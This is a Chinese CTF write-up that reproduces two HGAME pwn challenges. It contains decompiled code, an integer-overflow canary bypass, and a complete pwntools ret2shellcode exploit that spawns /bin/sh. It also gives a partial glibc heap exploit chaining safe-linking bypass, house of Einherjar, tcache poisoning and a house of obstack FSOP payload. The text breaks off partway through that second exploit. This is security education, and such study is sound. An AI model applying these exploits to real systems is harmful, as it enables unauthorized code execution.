#  HGAME 2026复现  
G0t1T
                    G0t1T  看雪学苑   2026-03-14 09:59  
  
**week1-adrift**  
# 看保护  
  
查看保护，发现栈有可执行权限，猜测跟ret2shellcode有关：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K3ficnh3ys7ib7jnNicDXvibPIr2HhhvicfgblXOPkG2ZNtiaIc5PQdic0sfSht7dtwhibEh6IFLNln7WbxOZj7wHlIjcMN4dtLHd8u9Ac/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
## 逆源码  
### main  
  
```
int __fastcall main(int argc, constchar **argv, constchar **envp){  _QWORD *v3; // rdx  __int16 v4; // ax  __int16 v6[2]; // [rsp+0h] [rbp-400h] BYREF  __int16 i; // [rsp+4h] [rbp-3FCh]  _QWORD v8[125]; // [rsp+6h] [rbp-3FAh] BYREF  __int64 v9; // [rsp+3F0h] [rbp-10h]init_canary(argc, argv, envp);  v9 = canary;putchar(10);while ( 1 )  {printf("choose> ");    __isoc99_scanf("%hd", v6);switch ( v6[0] )    {case 0:printf("way> ");read(0, v8, 0x410uLL);printf("distance> ");for ( i = 0; i <= 200 && dis[i]; ++i )          ;        v3 = (_QWORD *)((char *)&str + 1304 * i);        *v3 = v8[0];        v3[124] = v8[124];qmemcpy(          (void *)((unsigned __int64)(v3 + 1) & 0xFFFFFFFFFFFFFFF8LL),          (constvoid *)((char *)v8 - ((char *)v3 - ((unsigned __int64)(v3 + 1) & 0xFFFFFFFFFFFFFFF8LL))),8LL * ((((_DWORD)v3 - (((_DWORD)v3 + 8) & 0xFFFFFFF8) + 1000) & 0xFFFFFFF8) >> 3));memset(v8, 0, sizeof(v8));        __isoc99_scanf("%lu", &dis[i]);break;case 1:delete();break;case 2:show();break;case 3:printf("index> ");        __isoc99_scanf("%hd", v6);        v4 = v6[0];if ( v6[0] <= 0 )          v4 = -v6[0];        v6[0] = v4;if ( v4 > 200 )        {puts("invalid index");        }else        {printf("a new distance> ");          __isoc99_scanf("%lu", &dis[v6[0]]);        }break;case 4:if ( v9 != canary )        {printf("it's a poor decision :(");exit(0);        }return 0;default:continue;    }  }}
```  
  
  
  
main函数设置了一个canary，checksec才看不出来。从canary = (__int64)&v1可以看出，这个canary是全局变量，存放栈上的地址。  
  
```
init_canary(argc, argv, envp);v9 = canary;__int64 *init_canary(){  __int64 *result; // rax  __int64 v1; // [rsp+8h] [rbp-8h] BYREFsetvbuf(stdout, 0LL, 2, 0LL);setvbuf(stdin, 0LL, 2, 0LL);setvbuf(stderr, 0LL, 2, 0LL);  v1 = (__int64)&v1;  result = &v1;  canary = (__int64)&v1;return result;}
```  
  
  
  
接着在while循环里用了个switch，对应四种功能，首先看case 0，因为v8[128]的空间是0x3e8，跟rbp的距离是0x3FA，而read(0, v8, 0x410uLL);则会导致栈溢出，溢出长度是0x28，可以覆盖到返回地址+0x6的位置。注意memset(v8, 0, sizeof(v8));会清空v8的内容。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K07Gn7hYPTNx6wib3xB3dicRKknmqxNNHGxPIXb2YHjMWoRsLwVzdPtRGD48LxJxsUgjxyx4PUKQyr3uh9owGKAIic2YuW9GgQO0M/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
### delete  
  
```
int delete(){  __int16 v1; // [rsp+Eh] [rbp-2h]printf("index> ");  __isoc99_scanf("%hd");  dis[v1 % 201] = 0LL;return printf("%hd", (unsigned int)(v1 % 201));}
```  
  
  
  
这里对应case 1，把dis数组对应索引位置清0.  
### show  
  
```
intshow(){  __int64 v0; // rax  __int16 v2; // [rsp+Eh] [rbp-2h] BYREFprintf("index> ");  __isoc99_scanf("%hd", &v2);LOWORD(v0) = v2;if ( v2 <= 0 )LOWORD(v0) = -v2;  v2 = v0;LODWORD(v0) = (unsigned __int16)v0;if ( (__int16)v0 <= 199 )  {    v0 = dis[v2];if ( v0 )LODWORD(v0) = printf(": %lu\n", dis[v2]);  }return v0;}
```  
  
  
  
这个函数用来打印dis对应索引的值，要求索引值是正数。但这里存在个问题LOWORD(v0) = -v2;首先%hd输入的是两个字节，v2是用补码表示的，-v2则是将v2做取反运算再+1。  
  
  
比如说  
  
+5  
二进制是101  
：  
- 0000 0000 0000 0101  
（十六进制0x0005  
）  
  
对0x0005  
：  
- 按位取反：1111 1111 1111 1010  
（0xFFFA  
）  
  
- 再 +1：1111 1111 1111 1011  
（0xFFFB  
）  
  
所以：  
- -5  
的 16 位补码 =1111 1111 1111 1011  
（0xFFFB  
）  
  
对-5  
的比特0xFFFB  
：  
- 按位取反：0000 0000 0000 0100  
（0x0004  
）  
  
- 再 +1：0000 0000 0000 0101  
（0x0005  
）  
  
得到：  
- 0x0005  
=+5  
  
****  
**这里有个特殊情况**  
：最小负数无法变成正数。  
  
  
比如 16 位有符号数的最小值是-32768  
，它的相反数32768  
超出范围，会溢出，取反+1后反而等于自身。  
  
  
可以看到canary在dis的低地址方向，差了0x40000，再除以8，刚好等于32768，所以我们可以输入index为-32768达到数组越界打印canary，从而泄露栈地址。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K3bicKh2yT0KmT3QVjUW590mxB8Ga2icCvtNm7CZSlFXl6HMLqYeJqOfNiaz0MB1x0hFu7a8ibQQ9bnp4CAGbzGsAamZa4MYfx5iaBs/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
### case3  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K2HWoSAb04sicCHZjwhCoHX83ENEg71rJGEqwxswZNE9pOibgfGuVOryiaA8r7iaiaiaJZYibtXiaia87MK94uDQfALwjFahMRYt5NibHE2E/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
case3同样存在整数溢出的问题，输入index为-32768，就可以修改canary值  
### case4  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K3Eviawdiaia0X01bOFZISaxDdUa81bRoM1PU2W0jcFVGRG3bibicX1jG03GMA4kUtadeWMRzZgPxRgkIegHn1AC0rz9hjelheibz8lI/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
检查canary值  
## 思路  
1. 选择case2打印canary的值，泄露栈地址。  
  
1. 选择case3修改canary的值，绕过case4的检查。  
  
1. 选择case0的栈溢出写入shellcode，并将返回地址覆盖为shellcode的地址（通过调试计算偏移）  
  
1. 选择case4触发shellcode执行  
  
需要注意写入的shellcode只能写到返回地址之前，返回地址需要存放shellcode的地址，所以shellcode最多只能写入0x1A（0x3FA-0x3E8+0x8）。不过这里为了方便对齐，我直接从rbp-0x10（注意这里要修改canary的值等于shellcode的前八个字节，绕过检查）开始写，只写入0x18长度的shellcode。  
## 偏移  
  
把断点打在设置canary之后，查看canary的值，存着栈地址：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K1SHI8MkwWlbFh6rTZUDxAZ0UvG9MibfByNXzDMkrbEhiaWEuMxF9Lo5W4c5WEWQCKuPctiawiaialOH5X6ia934trdibmVRCPaXCwPUw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
  
再看rbp的值：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K30iaL3R0miaOKb6EJovg8jhwYWxuxISggGQiaCiaAGISUR3LfXw1bPrQu9dqUbHlhNktQRHDR5ZBCkVicdibZhtjCVcFQxdk0xh4icUo/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
  
计算到canary也就是rbp-0x10的偏移是0x408，后面我们泄露出栈地址，加上这个偏移就是shellcode的地址了。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K3yD55nzLYKbZpUGpyGOuQqgApHt6xFMmia75s3OZL4wAqRSUxmQxh1uQkT1BfL0e0WKs6mmyvhANLyyMVgv9EUfFw4XLzfHZfM/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
## EXP  
  
```
from pwn import *context(arch = 'amd64',os = 'linux',log_level = 'debug')io = process('./vuln')#io = remote("cloud-middle.hgame.vidar.club",32265)io.sendlineafter(b"choose> ",b"2")io.sendlineafter(b"index> ",b"-32768")io.recvuntil(b": ")aa = int(io.recvuntil(b"\n",drop=True))log.success(hex(aa))shellcode = asm('''        pop r11    mov rax, 0x68732f6e69622f        push rax        push rsp        pop rdi        xor eax, eax        mov al, 59        xor rdx, rdx        syscall''')# 因为rsp和shellcode挨得很近，两次push会破坏shellcode，所以这里我先pop一次抬高rsp的地址# rsi在调试的时候发现是0，就不用去赋值了log.info(len(shellcode))addr = aa + 0x408log.success(hex(addr))payload = b'a'*(0x3e8+2)+shellcode+p64(addr)io.sendlineafter(b"choose> ",b"3")io.sendlineafter(b"index> ",b"-32768")n = int.from_bytes(shellcode[:8], byteorder="little", signed=False)log.success(hex(n))io.sendlineafter(b"a new distance> ", str(n).encode())io.sendlineafter(b"choose> ",b"0")# gdb.attach(io,'b *$rebase(0x14EE)')# pause()io.sendafter(b"way> ",payload)io.sendlineafter(b"distance> ",b'233')io.sendlineafter(b"choose> ",b"4")io.interactive()
```  
  
#   
  
**week2-diary keeper**  
  
```
patchelf --set-interpreter /home/glibc-all-in-one/libs/2.35-0ubuntu3.13_amd64/ld-linux-x86-64.so.2 ./vulnpatchelf --replace-needed libc.so.6 /home/glibc-all-in-one/libs/2.35-0ubuntu3.13_amd64/libc.so.6 ./vuln
```  
  
## safe-linking  
  
在2.32版本，ptmalloc引入了PROTECT_PTR，即保护指针的概念，其指针是被异或加密的，如果对系统的堆地址一无所知，将无法正确解读泄露的指针的真实值。  
  
  
tcache_put当然也引入了这一机制，其next指针(fd)将会与entry首块进行异或加密。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K2SM6FDwicBgzQUcjGWfhIWmb56APdLVlUVnQ1jGVOaTMl3JrnR2ibelOa1ibiawfW7WBwMhmFIAjVwJvkU42v3FGYlqa5w4vOH4zg/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
```
#definePROTECT_PTR(pos, ptr) \((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
```  
  
  
  
结合两个代码，其实就是e->next =((&e->next) >> 12 ) ^ tcache -> entries[tc_idx]  
  
  
触发这个 PROTECT_PTR 宏，有两种情况：  
  
第一种是当前 free 的堆块是第一个进入 tcache bin 的（此前 tcache bin 中没有堆块），这种情况原本 next 的值就是 0 。第二种情况则是原本的 next 值已经有数据了。  
  
  
如果是第一种情况的话，对于 safe-Linking 机制而言，可能并没有起到预期的作用，因为将当前堆地址右移 12 位和 0 异或，其实值没有改变，如果我们能泄露出这个运算后的结果，再将其左移 12 位就可以反推出来堆地址，如果有了堆地址之后，那我们依然可以篡改 next 指针，达到任意地址申请的效果。  
  
  
举个栗子：  
  
  
当前tcachebins是空的：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K0OBlkJO5xS85icCywnfEYvlQia1L8Xd9ajcK70tDXVpGtEqfyPdCeaJ1ckMwjNnDfWHIDhKhibeXv1nVbibey9pdTicY7uUVco6Sy0/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
  
我们free一个size为0x100的chunk，可以看到这个chunk加密后的next指针是0x000000055924f45f。还是看e->next =((&e->next) >> 12 ) ^ tcache -> entries[tc_idx]这个代码。  
  
  
首先&e->next就是next指针的地址，也就是0x55924f45fbd0，再就是tcache -> entries[tc_idx]，在我们free之前，这个tcachebin是空的，所以就是0了，也就是变成了e->next =((&e->next) >> 12 ) ^ tcache -> entries[tc_idx] = (0x55924f45fbd0 >> 12) ^ 0 = 0x55924f45f。这对应第一种情况。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K1mDGdh4vjKicF3Bn8arW8rppLTLPonoR7QZTP1iaaMoTpyqWD6GGnVa5n45yN30mDppiccts1ktIZe8qUbxAMYlBxJ9iaCYE8mwOE/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K194qgNppULfQ4aQXp3cpET9PhLU4cfiaqGvxkP2icVM9eA0kkZUCpOWDetHxrT3Dw84UD3eOoRrk7iaP9TpZkUFjDXpuMSoYkpj8/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
  
接着我们再free一个同样是size为0x100的chunk，首先&e->next就是next指针的地址，也就是0x55924f45fcd0，再就是tcache -> entries[tc_idx]。  
  
  
在我们free之前，这个tcachebin是有一个chunk的，指向的是0x55924f45fbd0，也就是变成了e->next =((&e->next) >> 12 ) ^ tcache -> entries[tc_idx] = (0x55924f45fcd0 >> 12) ^ 0x55924f45fbd0 =0x559716610f8f 。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K3jUBS1sQz2c8cFsiasjABHERIoVEJ3hOKQLma0F7Rict1BYgYtU56CJyQicZLGbrqsVvIEZ3pmlhmOA0tYQWUeq28o07zwB9YxeM/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K1YZibskRGFbdXY0BeW7eUicV3fCmStGZrStzMrcibRttBaxHkUbuH7ibf5rQHiaZOP1Oa7XiaSxoRIQwib7FHJhpldYVianC3ib5hq1sJs/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
  
恢复 next 的宏为 [#define]()  
 REVEAL_PTR(ptr) PROTECT_PTR (&ptr, ptr) ，其实这个宏最终还是调用了 PROTECT_PTR ，原理就是 A=B^C ; C=A^B  
  
  
所以我们要想解密next指针，就变成了e->next = (&tcache -> entries[tc_idx] >> 12) ^ tcache -> entries[tc_idx]。这里的&tcache -> entries[tc_idx]其实就是&e->next  
  
  
以第二种情况为例子：  
  
e->next = (&tcache -> entries[tc_idx] >> 12) ^ tcache -> entries[tc_idx] = (0x55924f45fcd0 >> 12) ^ 0x559716610f8f = 0x55924f45fbd0  
  
  
所以只要我们成功泄露&e->next的值或者heap基址，就可以通过设置加密的next指针为e->next = ((&e->next) >> 12 ) ^ target_addr ，实现申请任意地址的chunk  
## house of Einherjar  
  
原理：利用off by null修改掉chunk的size域的P位，绕过unlink检查，在堆的后向合并过程中构造出chunk overlapping。  
  
  
例子：  
  
```
申请chunk A、chunk B、chunk C、chunk D，chunk D用来做gap，chunk A、chunk C都要处于unsortedbin范围释放A，进入unsortedbin对B写操作的时候存在off by null，修改了C的P位释放C的时候，堆后向合并，直接把A、B、C三块内存合并为了一个chunk，并放到了unsortedbin里面读写合并后的大chunk可以操作chunk B的内容
```  
  
## house of obstack  
  
参考https://tttang.com/archive/1845/  
  
  
模板：  
  
```
payload = flat(    {0x8:1,0x10:0,0x38:address_for_rdi,0x28:address_for_call,0x18:1,0x20:0,0x40:1, 0xd0:heap_base + 0x250,0xc8:libc_base + get_IO_str_jumps() - 0x300 + 0x20    },    filler = '\x00')
```  
  
## 查看保护  
  
保护全开  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K2MYamCqIaPs7jaAXIOicLs6ibythtqdBNIlJhJAOJLLbC4Vxia9xtGdECrAOn5PFmMI9bn0HqpSuSl7XewSkgU6ibeyf1Q7WYIrQ8/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
## 逆源码  
### main函数  
  
还是一个菜单题，共有四种功能，前三种分别对应写、删除、打印日记，最后一种对应退出程序，使用exit(0)退出。当执行exit函数时会触发<font style="color:rgba(0, 0, 0, 0.87);">_IO_flush_all_lockp</font>  
  
```
__int64 sub_127C(){write(1, "1.write a new diary.\n", 0x15uLL);write(1, "2.delete a diary.\n", 0x13uLL);write(1, "3.show a diary.\n", 0x11uLL);write(1, "4.exit.\n", 8uLL);write(1, "input your choice:", 0x12uLL);return sub_1229();}void __fastcall __noreturn main(int a1, char **a2, char **a3){int v3; // [rsp+Ch] [rbp-4h]write(1, "Let's start writing a diary!\n", 0x1DuLL);memset(&dword_4360, 0, 0x190uLL);while ( 1 )  {    v3 = sub_127C();if ( v3 == 4 )    {write(1, "Goodbye!\n", 9uLL);exit(0);    }if ( v3 > 4 )    {LABEL_12:write(1, "You can't do that.\n", 0x13uLL);    }else    {switch ( v3 )      {case 3:sub_15EB();break;case 1:sub_130D();break;case 2:sub_1553();break;default:goto LABEL_12;      }    }  }}
```  
  
### case 1-写日记  
  
该函数首先需要输入一个小于0x64的索引，且需要unk_4040[index]为空，unk_4040用来存放malloc返回的用户地址。接着就是输入申请的内存大小v2，最终申请的内存大小会在v2基础上加上16。申请完后接着就是写入两次八字节分别是date和weather，再写入v2个字节为content字段。  
  
```
_DWORD *sub_130D(){  _DWORD *result; // raxint v1; // [rsp+0h] [rbp-10h]int v2; // [rsp+4h] [rbp-Ch]int v3; // [rsp+Ch] [rbp-4h]write(1, "input index:", 0xCuLL);  v1 = sub_1229();if ( (unsigned int)v1 >= 0x64 )return (_DWORD *)write(1, "Invalid index!\n", 0xFuLL);if ( *((_QWORD *)&unk_4040 + v1) )return (_DWORD *)write(1, "Note at index already exists!\n", 0x1EuLL);write(1, "size:", 5uLL);  v2 = sub_1229();  *((_QWORD *)&unk_4040 + v1) = malloc(v2 + 16);if ( !*((_QWORD *)&unk_4040 + v1) )return (_DWORD *)write(1, "Memory allocation failed!\n", 0x1AuLL);write(1, "date:", 5uLL);read(0, *((void **)&unk_4040 + v1), 8uLL);write(1, "weather:", 0x12uLL);read(0, (void *)(*((_QWORD *)&unk_4040 + v1) + 8LL), 8uLL);write(1, "content:", 8uLL);  v3 = read(0, (void *)(*((_QWORD *)&unk_4040 + v1) + 16LL), v2);  *(_BYTE *)(*((_QWORD *)&unk_4040 + v1) + v3 + 16) = 0;  result = dword_4360;  dword_4360[v1] = v3 + 16;return result;}
```  
  
  
  
需要注意*(_BYTE)(  
((_QWORD *)&unk_4040 + v1) + v3 + 16) = 0;这里存在off by null，可以覆盖高地址chunk的size最低一个字节为0x0  
### case 2-删除日记  
  
输入小于0x63的索引，free掉对应索引的内存。  
  
```
intsub_1553(){  _DWORD *v0; // raxint v2; // [rsp+Ch] [rbp-4h]write(1, "input index:", 0xCuLL);LODWORD(v0) = sub_1229();  v2 = (int)v0;if ( (unsignedint)v0 <= 0x63 )  {free(*((void **)&unk_4040 + (int)v0));    *((_QWORD *)&unk_4040 + v2) = 0LL;    v0 = dword_4360;    dword_4360[v2] = 0;  }return (int)v0;}
```  
  
### case 3-打印日记  
  
同样根据索引分别打印Date，Weather和Content的内容。  
  
```
intsub_15EB(){  __int64 v0; // raxint v2; // [rsp+Ch] [rbp-4h]write(1, "input index:", 0xCuLL);LODWORD(v0) = sub_1229();  v2 = v0;if ( (unsignedint)v0 <= 0x63 )  {    v0 = *((_QWORD *)&unk_4040 + (int)v0);if ( v0 )    {write(1, "Date: ", 6uLL);write(1, *((constvoid **)&unk_4040 + v2), 8uLL);write(1, "\n", 1uLL);write(1, "Weather: ", 9uLL);write(1, (constvoid *)(*((_QWORD *)&unk_4040 + v2) + 8LL), 8uLL);write(1, "\n", 1uLL);write(1, "Content: ", 9uLL);write(1, (constvoid *)(*((_QWORD *)&unk_4040 + v2) + 16LL), dword_4360[v2] - 16);LODWORD(v0) = write(1, "\n", 1uLL);    }  }return v0;}
```  
  
## 思路  
  
**泄露libc基址和heap基址：首先申请四个chunk，记A，B，C，D，A和C分别属于large bin的范围（B是为了防止在free时A和C合并，D则是防止C和top chunk合并），接着free chunkA和chunkC，此时unsorted bin->chunkC->chunkA->unsorted bin。因此chunkA的fd指针指向main_arena+0x60，bk指针指向chunkC的首地址，只要我们重新申请回chunkA，接着利用打印功能打印Date和Weather，就可以泄露libc基址和heap基址。**  
  
  
**house of Einherjar：首先申请9个size为0x100的chunk，记为chunk1，chunk2。。。chunk9。chunk7在申请的时候要先写入fake chunk，依次free chunk1-chunk6，chunk8，此时tcache bin满了，再申请chunk8并利用off by null覆写chunk9的size的P位，接着free chunk8，此时tcache已满，再free chunk9，触发unlink，会把chunk7，chunk8，chunk9合并为一个大chunk放入unsortedbin中**  
  
****  
**tcache poisoning：此时unosortedbin中存在chunk7，chunk8，chunk9合并成的一个大chunk，记为big chunk，而chunk8位于tcache bin中，我们可以申请回big chunk，覆写chunk8的next指针指向(&e->next >> 12) ^ _IO_list_all（为了绕过safe linking），接着申请两次size为0x100的chunk，会从tcache里取，第二次就申请到了_IO_list_all，覆盖该值为一个堆地址，这里覆盖为chunkC+0x20的地址。**  
  
****  
**house of obstack：接着就是free chunkC，重新申请chunkC写入伪造的IO_file结构，按obstack利用链的模板。最后退出程序触发<font style="color:rgba(0, 0, 0, 0.87);">_IO_flush_all_lockp获取shell。</font>**  
## 本地调试  
  
```
def add(index,size,date,weather,content):    io.sendlineafter("input your choice:",b'1')    io.sendlineafter("input index:",str(index).encode())    io.sendlineafter("size:",str(size).encode())    io.sendlineafter("date",date)    io.sendlineafter("weather:",weather)    io.sendlineafter("content:",content)def dele(index):    io.sendlineafter("input your choice:",b'2')    io.sendlineafter("input index:",str(index).encode())def show(index):    io.sendlineafter("input your choice:",b'3')    io.sendlineafter("input index:",str(index).encode())
```  
  
  
  
先写一下程序交互：  
  
```
add(0,0x410,b'',b'',b'') # chunkAadd(1,0x40,b'',b'',b'') # chunkB，防止A和C合并add(2,0x420,b'',b'',b'') # chunkCadd(3,0x40,b'',b'',b'') # chunkD，防止C和top chunk合并dele(0)dele(2) # 此时unsorted bin为unsorted bin -> chunkC -> chunkA
```  
  
  
  
申请四个chunk并free chunkA和chunkC，此时unsorted bin为unsorted bin -> chunkC -> chunkA ->unsorted bin，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K1HQnReohAVGhdaP6S4lVibvvicfjU1ptSVPkCbYlM0WdaRZr8Vg6qKZC8XxmLa37wuD0lf4EVnaFrquzvUHaYRr2vYfP9bWoU1U/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
  
vmmap看一下libc基址和heap基址，算出偏移分别是0x21ace0和0x720  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K1br555xeq54wQuwrqia1jr3XsFAm29Sc4qibyWq2ygadV9xuvdmk1xYPZHHVkpmdDsXNF2IIUwM9iaJtUc6IXe7IhpLytuGHrtBc/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
```
add(0,0x410,b'',b'',b'')show(0) #申请回chunkA并打印地址信息io.recvuntil(b"Date: ")libc_base = u64(io.recv(6).ljust(8,b"\x00")) - 0x21ac0a # 泄露libc基址log.success(hex(libc_base))io.recvuntil(b"Weather: ")heap_base = u64(io.recv(6).ljust(8,b"\x00")) - 0x70a # 泄露heap基址log.success(hex(heap_base))
```  
  
  
  
接着申请回chunkA并打印信息。  
  
  
需要注意的是，再申请回chunkA的过程中，需要往内存里写东西，为了不破坏地址信息，这里只写入了换行符，所以libc和heap偏移分别要改成0x21ac0a和0x70a  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K3nZ3DM25PK2T3SDAickZToicnJZuunh8rjvF2ciaq3T6Lj5I1N10bMUiaI9Y6ZVsdEoPrRuvYGQAMYXfSrh6mhiaO5Dw7TwJ6UfQtY/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
```
add(2,0x420,b'',b'',b'') # 申请回chunkC，防止被split
```  
  
  
  
这里把chunkC申请回来，因为后面要申请0x100大小的chunk，会split，比较麻烦。  
  
```
# 申请六个chunk，分别记为chunk1，chunk2。。chunk6for i in range(6):add(4+i,0xe0,b'',b'',b'')''伪造fake chunk，heap_base +0x11e0是chunk7首地址+0x20的地址p64(heap_base +0x11e0)*2是为了绕过if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \  malloc_printerr ("corrupted double-linked list");'''payload1 = p64(0) + p64(0x1e0) + p64(heap_base + 0x11e0)*2add(10,0xe0,b'',b'',payload1) # 申请chunk7add(11,0xe0,b'',b'',b'')# 申请chunk8add(12,0xe0,b'',b'',b'')# 申请chunk9
```  
  
  
  
这里申请了9次chunk，chunk7要设置fake chunk绕过unlink检查。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K3VlFGvREQZz5JUXic7YiaRz8syNPHgo9ichFRUgJHebU8vfEme6IDdictMfLJFvvHyn1gQNfwAY7UGKHc32mtMZ6CLj2PC5YIibNuw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
```
for i in range(6):#依次free chunk1-chunk6，会放入tcache bindele(4+i)dele(11) # free chunk8，此时tcachebin满了
```  
  
  
  
此时tcachebin满了：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K1F1SE0sdeSNBTLWPIAn6I4ibFw6VyOehzMibKxu3wH9FA49fTN5pgsS4KwLZdu9RwdqhKeaAhHgxlXfheBlvzzW54CtwkLrOhr8/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
```
payload2 = b'a'*0xe0 + p64(0x1e0)# 重新申请回chunk8，写prev_size，利用off by null覆写chunk9的P位# 因为off by null是写一个字节，所以chunk的size最好是0x100这种最后一个字节为0x00的，不然会报错，所以我之前申请的都是malloc(0xe0+16)add(11,0xe8,b'',b'',payload2)add(13,0x40,b'',b'',payload2)# 防止big chunk和top chunk合并，方便观察，其实和top chunk合并也可以dele(11) # free chunk8，此时tcachebin又满了dele(12)# free chunk9，触发unlink，把chunk7，8，9合并成一个big chunk存入unsorted bin
```  
  
  
  
chunk9修改前：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K3QRhSNnEOicuyxddOyN4fEAXFzz2sFUN0lLUy3Mdk4jL4eL1FSYnbWWvpVWP1ibBsrlymfqA1IbT2xQ5CIAgxJcZkAgnZOx1deE/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
  
chunk9修改后，可以看到P被改为0，设置了prev_size  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K2EeR4zEHvnE4zO9OW9va5eldQ8snUHUSThSMpWe7siaHI9YVt5511n7uoPR0onias7sPYy4Eq7qGdfUJ9SM2Moia9mk4HoZMvKiaU/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
  
unlink时，这里prev_size的设置是为了绕过__builtin_expect(chunksize(P)!=prev_size(next_chunk(P)),0)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K1WH1wyjB7wpshia04EYNv5UKublljT1Y3eApc64NqgtPqjCOmERJlIia7Gqr2zJNo4ELoEZOz3sKgAFKm6ibpXODmZpOqchqZGbw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
  
big chunk放入了unsortedbin中，size为0x2e0，因为不是同一次调试，地址不一样了，凑合着看吧。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K3Gd5w8kJKcFowYaicQZsSlkXfmzZ6ul0JU7HRzSjXhcevnk8sUTBzvrjl4O1tqkEzHIkTXaiccdgPYmGASDjk2WXtibVlpjBDKg8/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
```
system = libc_base + libc.symbols['system']bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))IO_list_all = libc_base + libc.symbols['_IO_list_all']io_list = (heap_base + 0x12d0) >> 12 ^ IO_list_all # 覆盖next指针用的，为了绕过safe-linking_IO_obstack_jumps = libc_base + 0x2173c0payload3 = b'a'*0xc8 + p64(0x101) + p64(io_list)add(14,0x2c0,b'',b'',payload3)# 申请回big chunk，覆写chunk8的next指针add(15,0xe0,b'',b'',b'')# 申请chunk8add(16,0xe0,p64(heap_base+0x740),b'',b'')# 申请我们指向的IO_list_all，这里heap_base+0x740写的是chunkC+0x20的地址
```  
  
  
  
看回chunk7，根据safe-linking的代码e->next =((&e->next) >> 12 ) ^ tcache -> entries[tc_idx]，&e->next就是0x5612b4e3d2d0，tcache -> entries[tc_idx]就是之前tcachebin长度为6的情况，是0x5612b4e3d0d0，计算结果为0x5617d5c89eed。我们之前泄露了heap基址，计算得到&e->next偏移是0x12d0，我们只需要伪造target_addr为&_IO_list_all即可。  
  
```
hex((0x5612b4e3d2d0>>12)^0x5612b4e3d0d0)'0x5617d5c89eed'
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K2EZBJSgmlibTbGwmhRJmNicbIM6uy21eibFjQIkhuVzbqFlOtPFjKSibu67qH0ha8V34lRK07BISzS7S2cyLgFdOYOgdBialf0UpvQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
  
覆写next指针后，申请回chunk8，下一个就是_IO_list_all了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Cpo2XCpI7K0ZMWwFGib2UE9tQKic7CgMhJiat8zBLLZOfUdtmWhoajtonAmicT2A6e2bywC8aiblzKg4NZwFBicFYYJpicd7zYesRTO36RfCicusSBc/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
  
  
接着就是申请这个_IO_list_all，然后改为chunkC+0x20的地址，偏移是0x740，因为我们后面写入的IO_file结构是在content字段，prev_size，size，Date，weather刚好是0x20  
  
```
